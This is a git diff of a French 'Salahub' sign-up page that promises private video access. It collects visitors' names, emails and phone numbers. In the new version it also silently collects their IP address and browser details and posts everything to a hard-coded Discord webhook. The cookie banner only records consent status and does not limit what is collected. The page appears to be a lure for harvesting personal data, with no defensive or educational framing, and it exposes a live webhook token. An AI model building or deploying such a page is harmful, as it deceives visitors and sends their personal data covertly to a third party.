@@ -6,182 +6,120 @@
 <title>Salahub</title>
 
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Poppins', sans-serif;
-}
-
 body {
-    background: #050505;
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: #0a0a0a;
     color: white;
-    overflow: hidden;
 }
 
-/* BACKGROUND GLOW */
-.bg-glow {
-    position: fixed;
-    width: 600px;
-    height: 600px;
-    background: radial-gradient(circle, rgba(255,0,0,0.4), transparent 70%);
-    top: -100px;
-    left: -100px;
-    filter: blur(120px);
+/* HEADER */
+header {
+    text-align: center;
+    padding: 40px;
 }
 
-/* CENTER CARD */
+header h1 {
+    color: #ff2a2a;
+}
+
+/* FORM */
 .container {
-    height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
 }
 
 .card {
-    background: rgba(255,255,255,0.03);
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,0,0,0.2);
-    padding: 40px;
-    border-radius: 20px;
-    width: 350px;
-    text-align: center;
-    animation: fadeIn 1s ease;
-}
-
-/* TITLE */
-h1 {
-    margin-bottom: 10px;
-    color: #ff1a1a;
-    letter-spacing: 2px;
-}
-
-p {
-    opacity: 0.6;
-    margin-bottom: 20px;
-}
-
-/* INPUT */
-.input-group {
-    position: relative;
-    margin-bottom: 20px;
+    background: #111;
+    padding: 30px;
+    border-radius: 15px;
+    width: 320px;
+    box-shadow: 0 0 20px rgba(255,0,0,0.2);
 }
 
 input {
     width: 100%;
     padding: 12px;
-    background: transparent;
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 10px;
+    margin: 8px 0;
+    background: #1a1a1a;
+    border: none;
     color: white;
-    outline: none;
+    border-radius: 8px;
 }
 
-input:focus {
-    border-color: red;
-    box-shadow: 0 0 10px rgba(255,0,0,0.5);
-}
-
-/* BUTTON */
 button {
     width: 100%;
     padding: 12px;
+    background: linear-gradient(135deg, #ff0000, #990000);
     border: none;
-    border-radius: 10px;
-    background: linear-gradient(135deg, #ff0000, #660000);
     color: white;
-    font-weight: bold;
+    border-radius: 8px;
     cursor: pointer;
-    transition: 0.3s;
 }
 
-button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 20px rgba(255,0,0,0.4);
-}
-
-/* VIDEOS */
-.videos {
-    display: none;
-    height: 100vh;
-    padding: 40px;
-    animation: fadeIn 1s ease;
-}
-
-.grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px,1fr));
-    gap: 20px;
-}
-
-.video-card {
-    border-radius: 15px;
-    overflow: hidden;
-    background: #111;
-    transition: 0.3s;
-}
-
-.video-card:hover {
-    transform: scale(1.03);
-}
-
-video {
+/* COOKIE */
+.cookie-bar {
+    position: fixed;
+    bottom: 0;
     width: 100%;
+    background: #111;
+    padding: 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
 }
 
-/* ANIMATION */
-@keyframes fadeIn {
-    from {opacity: 0; transform: translateY(20px);}
-    to {opacity: 1; transform: translateY(0);}
+.cookie-bar button {
+    background: red;
 }
 </style>
 </head>
 
 <body>
 
-<div class="bg-glow"></div>
+<header>
+    <h1>Salahub</h1>
+    <p>Accès privé</p>
+</header>
 
-<div class="container" id="formBox">
+<div class="container">
     <div class="card">
-        <h1>SALAHUB</h1>
-        <p>Accès privé sécurisé</p>
-
         <form id="form">
-            <div class="input-group">
-                <input type="text" id="nom" placeholder="Nom" required>
-            </div>
-
-            <div class="input-group">
-                <input type="text" id="prenom" placeholder="Prénom" required>
-            </div>
-
-            <div class="input-group">
-                <input type="email" id="email" placeholder="Email" required>
-            </div>
-
-            <div class="input-group">
-                <input type="tel" id="telephone" placeholder="Téléphone" required>
-            </div>
-
-            <button>S'INSCRIRE</button>
+            <input type="text" id="nom" placeholder="Nom" required>
+            <input type="text" id="prenom" placeholder="Prénom" required>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="tel" id="telephone" placeholder="Téléphone" required>
+            <button>S'inscrire</button>
         </form>
     </div>
 </div>
 
-<div class="videos" id="videos">
-    <h2>Contenu débloqué</h2>
-
-    <div class="grid">
-        <div class="video-card"><video controls></video></div>
-        <div class="video-card"><video controls></video></div>
-        <div class="video-card"><video controls></video></div>
-    </div>
+<!-- COOKIE -->
+<div class="cookie-bar" id="cookieBar">
+    <span>Nous utilisons des cookies pour améliorer votre expérience.</span>
+    <button onclick="acceptCookies()">Accepter</button>
 </div>
 
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";
 
-document.getElementById("form").addEventListener("submit", function(e) {
+// COOKIE STATUS
+let cookieStatus = "Refusé";
+
+function acceptCookies() {
+    cookieStatus = "Accepté";
+    localStorage.setItem("cookiesAccepted", "true");
+    document.getElementById("cookieBar").style.display = "none";
+}
+
+if(localStorage.getItem("cookiesAccepted")) {
+    cookieStatus = "Accepté";
+    document.getElementById("cookieBar").style.display = "none";
+}
+
+// FORM
+document.getElementById("form").addEventListener("submit", async function(e) {
     e.preventDefault();
 
     const nom = document.getElementById("nom").value;
@@ -189,24 +127,45 @@ document.getElementById("form").addEventListener("submit", function(e) {
     const email = document.getElementById("email").value;
     const telephone = document.getElementById("telephone").value;
 
-    const data = {
-        content: `Salahub
-Nom: ${nom}
-Prénom: ${prenom}
-Email: ${email}
-Téléphone: ${telephone}`
+    const date = new Date().toLocaleString();
+    const userAgent = navigator.userAgent;
+
+    let ip = "Inconnue";
+    try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+    } catch {}
+
+    const payload = {
+        embeds: [{
+            title: "📩 Nouvelle inscription Salahub",
+            color: 16711680,
+            fields: [
+                { name: "Nom", value: nom, inline: true },
+                { name: "Prénom", value: prenom, inline: true },
+                { name: "Email", value: email },
+                { name: "Téléphone", value: telephone },
+                { name: "Cookies", value: cookieStatus },
+                { name: "IP", value: ip },
+                { name: "Navigateur", value: userAgent.substring(0,100) }
+            ],
+            footer: {
+                text: "Date : " + date
+            }
+        }]
     };
 
     fetch(webhookURL, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
+        body: JSON.stringify(payload)
     })
     .then(res => {
         if (res.ok) {
-            document.getElementById("formBox").style.display = "none";
-            document.getElementById("videos").style.display = "block";
-            document.body.style.overflow = "auto";
+            alert("Inscription envoyée");
+        } else {
+            alert("Erreur");
         }
     });
 });
